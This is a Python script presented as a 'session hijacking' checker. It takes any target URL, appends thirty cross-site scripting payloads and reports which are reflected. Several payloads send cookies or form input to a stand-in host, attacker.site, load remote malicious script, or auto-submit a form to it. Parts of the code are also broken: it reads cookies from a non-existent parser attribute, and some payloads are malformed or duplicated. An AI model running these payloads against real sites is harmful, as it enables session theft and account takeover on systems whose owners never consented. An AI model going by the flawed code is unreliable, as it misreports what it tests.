import requests
from bs4 import BeautifulSoup
import pyfiglet
from colorama import Fore, Style

# Define payloads with vulnerability metrics
payloads = {
    
    'SH1': {'payload': '<script>alert("XSS")</script>', 'vulnerability_metric': 'high'},
    'SH2': {'payload': '<img src="x" onerror="alert(\'XSS\')" />', 'vulnerability_metric': 'high'},
    'SH3': {'payload': '<iframe src="javascript:alert(\'XSS\')"></iframe>', 'vulnerability_metric': 'high'},
    'SH4': {'payload': '<svg onload="alert(\'XSS\')"></svg>', 'vulnerability_metric': 'high'},
    'SH5': {'payload': '<body onload="alert(\'XSS\')">', 'vulnerability_metric': 'high'},
    'SH6': {'payload': '<img src="x:x" onerror="alert(\'XSS\')" />', 'vulnerability_metric': 'high'},
    'SH7': {'payload': '<img src="javascript:alert(\'XSS\')" />', 'vulnerability_metric': 'high'},
    'SH8': {'payload': '<img src=`%00>`', 'vulnerability_metric': 'high'},
    'SH9': {'payload': '<img src="javascript:document.write(\'<iframe src=http://attacker.site/token?%27+document.cookie%3C/script%3E\')" />', 'vulnerability_metric': 'high'},
    'SH10': {'payload': '<script src="http://attacker.site/malicious.js"></script>', 'vulnerability_metric': 'high'},
    'SH11': {'payload': '<link rel="stylesheet" type="text/css" href="http://attacker.site/malicious.css">', 'vulnerability_metric': 'high'},
    'SH12': {'payload': '<img src=x onerror=alert(1)>', 'vulnerability_metric': 'high'},
    'SH13': {'payload': '<svg/onload=alert(1)>', 'vulnerability_metric': 'high'},
    'SH14': {'payload': '<img src=x:alert(alt) onerror=eval(src) alt=x>', 'vulnerability_metric': 'high'},
    'SH15': {'payload': '<iframe/src="data:text/html,<svg onload=alert(1)>">', 'vulnerability_metric': 'high'},
    'SH16': {'payload': '<img src="http://attacker.site/xss.jpg" onmouseover="alert(\'XSS\');">', 'vulnerability_metric': 'high'},
    'SH17': {'payload': '<form id="form1" action="http://attacker.site" enctype="text/plain"><input type="submit"></form><script>document.getElementById(\'form1\').submit();</script>', 'vulnerability_metric': 'high'},
    'SH18': {'payload': '<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K">', 'vulnerability_metric': 'high'},
    'SH19': {'payload': '<iframe src="javascript:alert(\'XSS\');"></iframe>', 'vulnerability_metric': 'high'},
    'SH20': {'payload': '<form><input type="text" name="xss"><input type="submit"></form><script>new Image().src="http://attacker.site/?"+document.getElementsByName(\'xss\')[0].value;</script>', 'vulnerability_metric': 'high'},
    'SH21': {'payload': '<a href="javascript:alert(\'XSS\');">Click Me</a>', 'vulnerability_metric': 'high'},
    'SH22': {'payload': '<iframe src="javascript:alert(\'XSS\')"></iframe>', 'vulnerability_metric': 'high'},
    'SH23': {'payload': '<input type="text" name="xss"><img src="http://attacker.site/?"+document.getElementsByName(\'xss\')[0].value>', 'vulnerability_metric': 'high'},
    'SH24': {'payload': '<object data="javascript:alert(\'XSS\');"></object>', 'vulnerability_metric': 'high'},
    'SH25': {'payload': '<embed src="http://attacker.site/xss.swf" AllowScriptAccess="always"></embed>', 'vulnerability_metric': 'high'},
    'SH26': {'payload': '<applet code="javascript:alert(\'XSS\');"></applet>', 'vulnerability_metric': 'high'},
    'SH27': {'payload': '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\');">', 'vulnerability_metric': 'high'},
    'SH28': {'payload': '<a href="javascript:void(0)" onmouseover="alert(\'XSS\');">Click Me</a>', 'vulnerability_metric': 'high'},
    'SH29': {'payload': '<marquee onstart="alert(\'XSS\');">Test</marquee>', 'vulnerability_metric': 'high'},
    'SH30': {'payload': '<xml id="xss"><a href="javascript:document.getElementById(\'xss\').parentNode.removeChild(document.getElementById(\'xss\'))">Click Me</a></xml><iframe src="javascript:alert(\'XSS\')"></iframe>', 'vulnerability_metric': 'high'},

}

def check_session_hijacking_vulnerability(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    session_info = extract_session_info(soup)

    print(Fore.GREEN + "Session Information:")
    print(Style.RESET_ALL)
    print(session_info)

    for payload_label, payload_data in payloads.items():
        payload = payload_data['payload']
        vulnerability_metric = payload_data['vulnerability_metric']
        check_vulnerability_with_payload(url, payload_label, payload, vulnerability_metric)

def extract_session_info(soup):
    session_info = {
        'cookies': soup.cookies,
        'hidden_fields': soup.find_all('input', type='hidden'),
        'session_variables': soup.find_all('script'),
        'csrf_token': soup.find('meta', attrs={'name': 'csrf-token'}),
        'auth_token': soup.find('input', attrs={'name': 'authenticity_token'}),
        'user_id': soup.find('input', attrs={'name': 'user_id'}),
        'username': soup.find('input', attrs={'name': 'username'}),
        'email': soup.find('input', attrs={'name': 'email'}),
        'role': soup.find('input', attrs={'name': 'role'}),
        'session_id': soup.find('input', attrs={'name': 'session_id'}),
        'jwt_token': soup.find('input', attrs={'name': 'jwt_token'}),
        'oauth_token': soup.find('input', attrs={'name': 'oauth_token'}),
        'api_key': soup.find('input', attrs={'name': 'api_key'}),
        'user_agent': soup.find('input', attrs={'name': 'user_agent'}),
        'referrer': soup.find('input', attrs={'name': 'referrer'}),
        'location': soup.find('input', attrs={'name': 'location'}),
        'last_activity': soup.find('input', attrs={'name': 'last_activity'}),
        'permissions': soup.find('input', attrs={'name': 'permissions'}),
        'language': soup.find('input', attrs={'name': 'language'}),
        'timezone': soup.find('input', attrs={'name': 'timezone'}),
        'is_admin': soup.find('input', attrs={'name': 'is_admin'}),
    }
    return session_info

def check_vulnerability_with_payload(url, payload_label, payload, vulnerability_metric):
    try:
        response = requests.get(url + payload)
        if payload in response.text:
            print(Fore.YELLOW + f"Payload {payload_label} successfully injected! Vulnerability metric: {vulnerability_metric}")
        else:
            print(Fore.RED + f"Payload {payload_label} failed to inject!")
    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    from colorama import init
    init(autoreset=True)

    ascii_banner = pyfiglet.figlet_format("SESSION HIJACKING")
    print(ascii_banner)

    print(Fore.YELLOW + "Session Hijacking Vulnerability Checker")
    print(Style.RESET_ALL)
    target_url = input("Enter the URL of the target website: ")
    if target_url:
        check_session_hijacking_vulnerability(target_url)
    else:
        print("Please enter a valid URL.")
